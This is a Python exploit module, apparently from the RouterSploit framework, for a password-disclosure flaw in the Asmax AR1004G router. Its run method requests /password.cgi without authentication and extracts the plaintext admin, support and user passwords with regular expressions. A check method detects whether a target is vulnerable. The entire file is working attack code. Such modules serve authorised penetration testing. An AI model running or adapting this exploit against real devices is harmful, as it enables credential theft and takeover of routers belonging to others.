from routersploit import (
    exploits,
    print_error,
    print_success,
    print_status,
    print_table,
    http_request,
    mute,
    validators,
    tokenize,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Asmax AR1004G Password Disclosure vulnerability.
    If the target is vulnerable it is possible to read credentials for admin, support and user accounts.
    """
    __info__ = {
        'name': 'Asmax AR1004G Password Disclosure',
        'description': 'Exploits Asmax AR1004G Password Disclosure vulnerability that allows to '
                       'fetch credentials for: Admin, Support and User accounts.',
        'authors': [
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://github.com/lucyoa/exploits/blob/master/asmax/asmax.txt',
        ],
        'devices': [
            'Asmax AR 1004g',
        ],
    }

    target = exploits.Option('', 'Target URL address e.g. http://192.168.1.1', validators=validators.url)  # target url address
    port = exploits.Option(80, 'Target HTTP port', validators=validators.integer)  # target http port

    def run(self):
        creds = []
        url = "{}:{}/password.cgi".format(self.target, self.port)

        print_status("Requesting {}".format(url))
        response = http_request(method="GET", url=url)
        if response is None:
            print_error("Exploit failed - empty response")
            return

        tokens = [
            ("admin", r"pwdAdmin = '(.+?)'"),
            ("support", r"pwdSupport = '(.+?)'"),
            ("user", r"pwdUser = '(.+?)'")
        ]

        print_status("Trying to extract credentials")
        for token in tokenize(tokens, response.text):
            creds.append((token.typ, token.value[-1]))

        if creds:
            print_success("Credentials found")
            print_table(("Login", "Password"), *creds)
        else:
            print_error("Exploit failed - credentials could not be found")

    @mute
    def check(self):
        url = "{}:{}/password.cgi".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        if any(map(lambda x: x in response.text, ["pwdSupport", "pwdUser", "pwdAdmin"])):
            return True  # target vulnerable

        return False  # target not vulnerable
